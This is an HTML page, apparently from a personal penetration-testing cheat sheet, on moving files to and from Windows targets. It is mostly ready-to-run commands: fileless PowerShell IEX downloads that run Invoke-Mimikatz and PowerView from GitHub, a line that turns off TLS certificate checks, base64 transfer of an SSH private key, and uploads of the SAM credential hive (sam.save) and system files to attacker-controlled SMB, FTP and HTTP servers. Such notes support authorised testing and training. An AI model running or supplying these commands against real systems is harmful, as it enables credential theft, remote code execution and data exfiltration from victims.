@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Pentest CheatSheet | Pentest CheatSheet</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Pentest CheatSheet" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Pentest CheatSheet" />
+<meta property="og:description" content="Pentest CheatSheet" />
+<link rel="canonical" href="http://localhost:4000/zNew/TransferFiles/Windows.html" />
+<meta property="og:url" content="http://localhost:4000/zNew/TransferFiles/Windows.html" />
+<meta property="og:site_name" content="Pentest CheatSheet" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Pentest CheatSheet" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Pentest CheatSheet","headline":"Pentest CheatSheet","url":"http://localhost:4000/zNew/TransferFiles/Windows.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>Pentest CheatSheet</h1>
+        </a>
+        <h2>Pentest CheatSheet</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="attack-to-target">Attack to Target</h1>
+<h2 id="powershell-base64-encode--decode">PowerShell Base64 Encode &amp; Decode</h2>
+<p><strong>Attack Check SSH Key MD5 Hash</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">md5sum </span>id_rsa
+</code></pre></div></div>
+
+<p><strong>Attack Encode SSH Key to Base64</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>id_rsa |base64 <span class="nt">-w</span> 0<span class="p">;</span><span class="nb">echo</span>
+</code></pre></div></div>
+
+<p><strong>Target Paste Base64</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS <span class="o">&gt;</span> <span class="o">[</span>IO.File]::WriteAllBytes<span class="o">(</span><span class="s2">"C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\P</span><span class="s2">ublic</span><span class="se">\i</span><span class="s2">d_rsa"</span>, <span class="o">[</span>Convert]::FromBase64String<span class="o">(</span><span class="s2">""</span><span class="o">))</span>
+</code></pre></div></div>
+
+<p><strong>Confirming the MD5 Hashes Match</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS <span class="o">&gt;</span> Get-FileHash C:<span class="se">\U</span>sers<span class="se">\P</span>ublic<span class="se">\i</span>d_rsa <span class="nt">-Algorithm</span> md5
+</code></pre></div></div>
+
+<h2 id="powershell-web-downloads">PowerShell Web Downloads</h2>
+<p>| Method                | Description                                                        |
+|———————–|——————————————————————–|
+| OpenRead              | Returns the data from a resource as a Stream.                      |
+| OpenReadAsync         | Returns the data from a resource without blocking the calling thread. |
+| DownloadData          | Downloads data from a resource and returns a Byte array.           |
+| DownloadDataAsync     | Downloads data from a resource and returns a Byte array without blocking the calling thread. |
+| DownloadFile          | Downloads data from a resource to a local file.                    |
+| DownloadFileAsync     | Downloads data from a resource to a local file without blocking the calling thread. |
+| DownloadString        | Downloads a String from a resource and returns a String.           |
+| DownloadStringAsync   | Downloads a String from a resource without blocking the calling thread. |</p>
+
+<p><strong>File Download</strong>
+We can specify the class name Net.WebClient and the method DownloadFile with the parameters corresponding to the URL of the target file to download and the output file name.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS <span class="o">&gt;</span> <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1'</span>,<span class="s1">'C:\Users\Public\Downloads\PowerView.ps1'</span><span class="o">)</span>
+
+
+PS <span class="o">&gt;</span> <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadFileAsync<span class="o">(</span><span class="s1">'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'</span>, <span class="s1">'C:\Users\Public\Downloads\PowerViewAsync.ps1'</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p><strong>Fileless Method</strong>
+As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS <span class="o">&gt;</span> IEX <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1'</span><span class="o">)</span>
+
+
+PS <span class="o">&gt;</span> <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1'</span><span class="o">)</span> | IEX
+</code></pre></div></div>
+
+<p><strong>Invoke-WebRequest</strong>
+From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS <span class="o">&gt;</span> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 <span class="nt">-OutFile</span> PowerView.ps1<span class="sb">`</span>
+</code></pre></div></div>
+
+<p><strong>Common Errors with PowerShell</strong>
+There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download..
+This can be bypassed using the parameter -UseBasicParsing.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS <span class="o">&gt;</span> Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 <span class="nt">-UseBasicParsing</span> | IEX<span class="sb">`</span>
+</code></pre></div></div>
+
+<p>Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS <span class="o">&gt;</span> IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">'https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1'</span><span class="o">)</span>
+
+PS <span class="o">&gt;</span> <span class="o">[</span>System.Net.ServicePointManager]::ServerCertificateValidationCallback <span class="o">=</span> <span class="o">{</span><span class="nv">$true</span><span class="o">}</span>
+</code></pre></div></div>
+
+<h2 id="smb-downloads">SMB Downloads</h2>
+<p><strong>Create the SMB Server</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>impacket-smbserver share <span class="nt">-smb2support</span> /tmp/smbshare
+</code></pre></div></div>
+
+<p><strong>Copy a File from the SMB Server</strong>
+New versions of Windows block unauthenticated guest access, as we can see in the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\h</span>ome&gt; copy <span class="se">\\</span>192.168.220.133<span class="se">\s</span>hare<span class="se">\n</span>c.exe
+
+You can<span class="s1">'t access this shared folder because your organization'</span>s security policies block unauthenticated guest access. These policies <span class="nb">help </span>protect your PC from unsafe or malicious devices on the network.
+</code></pre></div></div>
+
+<p>To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:</p>
+
+<p><strong>Create the SMB Server with a Username and Password</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>impacket-smbserver share <span class="nt">-smb2support</span> /tmp/smbshare <span class="nt">-user</span> <span class="nb">test</span> <span class="nt">-password</span> <span class="nb">test</span>
+</code></pre></div></div>
+
+<p><strong>Mount the SMB Server with Username and Password</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\h</span>ome&gt; net use n: <span class="se">\\</span>192.168.220.133<span class="se">\s</span>hare /user:test <span class="nb">test
+
+</span>C:<span class="se">\h</span>ome&gt; copy n:<span class="se">\n</span>c.ex
+</code></pre></div></div>
+
+<p>`Note: You can also mount the SMB server if you receive an error when you use copy filename \IP\sharename.</p>
+
+<h2 id="ftp-downloads">FTP Downloads</h2>
+<p><strong>Setting up a Python3 FTP Server</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> pyftpdlib <span class="nt">--port</span> 21
+</code></pre></div></div>
+
+<p><strong>Transfering Files from an FTP Server Using PowerShell</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS <span class="o">&gt;</span> <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">'ftp://192.168.49.128/file.txt'</span>, <span class="s1">'C:\Users\Public\ftp-file.txt'</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>When we get a shell on a remote machine, we may not have an interactive shell. If that’s the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.</p>
+
+<p><strong>Create a Command File for the FTP Client and Download the Target File</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\h</span>ome&gt; <span class="nb">echo </span>open 192.168.49.128 <span class="o">&gt;</span> ftpcommand.txt
+C:<span class="se">\h</span>ome&gt; <span class="nb">echo </span>USER anonymous <span class="o">&gt;&gt;</span> ftpcommand.txt
+C:<span class="se">\h</span>ome&gt; <span class="nb">echo </span>binary <span class="o">&gt;&gt;</span> ftpcommand.txt
+C:<span class="se">\h</span>ome&gt; <span class="nb">echo </span>GET file.txt <span class="o">&gt;&gt;</span> ftpcommand.txt
+C:<span class="se">\h</span>ome&gt; <span class="nb">echo </span>bye <span class="o">&gt;&gt;</span> ftpcommand.txt
+C:<span class="se">\h</span>ome&gt; ftp <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-s</span>:ftpcommand.txt
+ftp&gt; open 192.168.49.128
+Log <span class="k">in </span>with USER and PASS first.
+ftp&gt; USER anonymous
+
+ftp&gt; GET file.txt
+ftp&gt; bye
+</code></pre></div></div>
+
+<h1 id="target-to-attack">Target to Attack</h1>
+<h2 id="powershell-base64-encode--decode-1">PowerShell Base64 Encode &amp; Decode</h2>
+<p><strong>Encode File Using PowerShell</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS <span class="o">&gt;</span> <span class="o">[</span>Convert]::ToBase64String<span class="o">((</span>Get-Content <span class="nt">-path</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\d</span><span class="s2">rivers</span><span class="se">\e</span><span class="s2">tc</span><span class="se">\h</span><span class="s2">osts"</span> <span class="nt">-Encoding</span> byte<span class="o">))</span>
+
+
+PS <span class="o">&gt;</span> Get-FileHash <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\d</span><span class="s2">rivers</span><span class="se">\e</span><span class="s2">tc</span><span class="se">\h</span><span class="s2">osts"</span> <span class="nt">-Algorithm</span> MD5 | <span class="k">select </span>Hash
+</code></pre></div></div>
+
+<p><strong>Decode Base64 String in Linux</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="o">=</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> hosts
+
+<span class="nv">$ </span><span class="nb">md5sum </span>hosts
+</code></pre></div></div>
+
+<h2 id="powershell-web-uploads">PowerShell Web Uploads</h2>
+<p>PowerShell doesn’t have a built-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function. We’ll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.</p>
+
+<p>For our web server, we can use uploadserver, an extended module of the Python HTTP.server module, which includes a file upload page.</p>
+
+<p><strong>Installing a Configured WebServer with Upload</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>pip3 <span class="nb">install </span>uploadserver
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 <span class="nt">-m</span> uploadserver
+</code></pre></div></div>
+
+<p>Now we can use a PowerShell script <a href="https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1">PSUpload.ps1</a> which uses Invoke-RestMethod to perform the upload operations. The script accepts two parameters -File, which we use to specify the file path, and -Uri, the server URL where we’ll upload our file. Let’s attempt to upload the host file from our Windows host.</p>
+
+<p><strong>PowerShell Script to Upload a File to Python Upload Server</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS <span class="o">&gt;</span> IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">'https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1'</span><span class="o">)</span>
+
+PS <span class="o">&gt;</span> Invoke-FileUpload <span class="nt">-Uri</span> http://192.168.49.128:8000/upload <span class="nt">-File</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\d</span>rivers<span class="se">\e</span>tc<span class="se">\h</span>osts
+</code></pre></div></div>
+
+<h2 id="powershell-base64-web-upload">PowerShell Base64 Web Upload</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS <span class="o">&gt;</span> <span class="nv">$b64</span> <span class="o">=</span> <span class="o">[</span>System.convert]::ToBase64String<span class="o">((</span>Get-Content <span class="nt">-Path</span> <span class="s1">'C:\Windows\System32\drivers\etc\hosts'</span> <span class="nt">-Encoding</span> Byte<span class="o">))</span>
+
+PS <span class="o">&gt;</span> Invoke-WebRequest <span class="nt">-Uri</span> http://192.168.49.128:8000/ <span class="nt">-Method</span> POST <span class="nt">-Body</span> <span class="nv">$b64</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 8000
+
+<span class="nv">$ </span><span class="nb">echo</span> &lt;<span class="nb">base64</span><span class="o">&gt;</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="nt">-w</span> 0 <span class="o">&gt;</span> hosts
+</code></pre></div></div>
+
+<h2 id="smb-uploads">SMB Uploads</h2>
+<h3 id="webdav">WebDav</h3>
+<p><strong>Installing WebDav Python modules</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>pip3 <span class="nb">install </span>wsgidav cheroot
+</code></pre></div></div>
+
+<p><strong>Using the WebDav Python module</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>wsgidav <span class="nt">--host</span><span class="o">=</span>0.0.0.0 <span class="nt">--port</span><span class="o">=</span>80 <span class="nt">--root</span><span class="o">=</span>/tmp <span class="nt">--auth</span><span class="o">=</span>anonymous
+</code></pre></div></div>
+
+<p><strong>Connecting to the Webdav Share</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\h</span>ome&gt; <span class="nb">dir</span> <span class="se">\\</span>192.168.49.128<span class="se">\D</span>avWWWRoot
+</code></pre></div></div>
+
+<p><strong>Uploading Files using SMB</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\h</span>ome&gt; copy C:<span class="se">\U</span>sers<span class="se">\j</span>ohn<span class="se">\D</span>esktop<span class="se">\S</span>ourceCode.zip <span class="se">\\</span>192.168.49.129<span class="se">\D</span>avWWWRoot<span class="se">\</span>
+</code></pre></div></div>
+<h3 id="smbserver">smbserver</h3>
+<p><strong>Creating a Share with smbserver.py</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>python3 /usr/share/doc/python3-impacket/examples/smbserver.py <span class="nt">-smb2support</span> CompData /home/ltnbob/Documents/
+</code></pre></div></div>
+
+<p><strong>Upload to Attack</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\h</span>ome&gt; copy sam.save <span class="se">\\</span>10.10.15.16<span class="se">\C</span>ompData
+
+C:<span class="se">\h</span>ome&gt; move sam.save <span class="se">\\</span>10.10.15.16<span class="se">\C</span>ompData
+
+C:<span class="se">\h</span>ome&gt; copy n:<span class="se">\n</span>c.ex
+</code></pre></div></div>
+
+<h2 id="ftp-uploads">FTP Uploads</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> pyftpdlib <span class="nt">--port</span> 21 <span class="nt">--write</span>
+</code></pre></div></div>
+
+<h3 id="powershell-upload-file">PowerShell Upload File</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS <span class="o">&gt;</span> <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.UploadFile<span class="o">(</span><span class="s1">'ftp://192.168.49.128/ftp-hosts'</span>, <span class="s1">'C:\Windows\System32\drivers\etc\hosts'</span><span class="o">)</span>
+</code></pre></div></div>
+
+<h3 id="create-a-command-file-for-the-ftp-client-to-upload-a-file">Create a Command File for the FTP Client to Upload a File</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\h</span>ome&gt; <span class="nb">echo </span>open 192.168.49.128 <span class="o">&gt;</span> ftpcommand.txt
+C:<span class="se">\h</span>ome&gt; <span class="nb">echo </span>USER anonymous <span class="o">&gt;&gt;</span> ftpcommand.txt
+C:<span class="se">\h</span>ome&gt; <span class="nb">echo </span>binary <span class="o">&gt;&gt;</span> ftpcommand.txt
+C:<span class="se">\h</span>ome&gt; <span class="nb">echo </span>PUT c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\d</span>rivers<span class="se">\e</span>tc<span class="se">\h</span>osts <span class="o">&gt;&gt;</span> ftpcommand.txt
+C:<span class="se">\h</span>ome&gt; <span class="nb">echo </span>bye <span class="o">&gt;&gt;</span> ftpcommand.txt
+C:<span class="se">\h</span>ome&gt; ftp <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-s</span>:ftpcommand.txt
+ftp&gt; open 192.168.49.128
+
+Log <span class="k">in </span>with USER and PASS first.
+
+
+ftp&gt; USER anonymous
+ftp&gt; PUT c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\d</span>rivers<span class="se">\e</span>tc<span class="se">\h</span>osts
+ftp&gt; bye
+</code></pre></div></div>
+
+
+      </section>
+    </div>
+  </body>
+</html>
